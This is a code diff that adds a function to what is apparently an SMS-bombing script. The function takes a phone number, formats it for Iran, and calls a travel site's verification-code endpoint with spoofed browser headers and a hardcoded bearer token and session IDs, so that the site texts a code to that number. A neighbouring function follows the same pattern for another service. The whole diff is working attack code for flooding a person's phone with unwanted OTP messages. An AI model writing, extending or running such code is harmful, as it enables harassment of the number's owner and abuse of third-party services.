@@ -56,6 +56,45 @@ def check_internet():
 
 
 
+
+
+def mrbilit(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = f"https://auth.mrbilit.ir/api/Token/send?mobile={formatted_phone}"
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Authorization": "Bearer eyJhbGciOiJIUzl1NilsInR5cCl6lkpXVCJ9.eyJidXMiOilOZilsInRybil6ljE3liwic3JjljoiMiJ9.vvpr9fgASvk7B714KQKCz-SaCmoErab_p3cslvULG1W",
+        "X-PlayerID": "dfb64872-1076-49c9-a2e1-a2a68eb80bf4",
+        "Sessionld": "session_adffeb7f-1d11-45fc-b0f7-2209fa54f1ba",
+        "Origin": "https://www.mrbilit.ir",
+        "Referer": "https://www.mrbilit.ir/",
+    }
+    
+    try:
+        response = requests.get(url, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(mrbilit) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (mrbilit) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] mrbilit Exception: {e}{a}')
+        return False
+
+
+
+
+
+
+
+
 def ghasedak24(phone):
     import requests
     
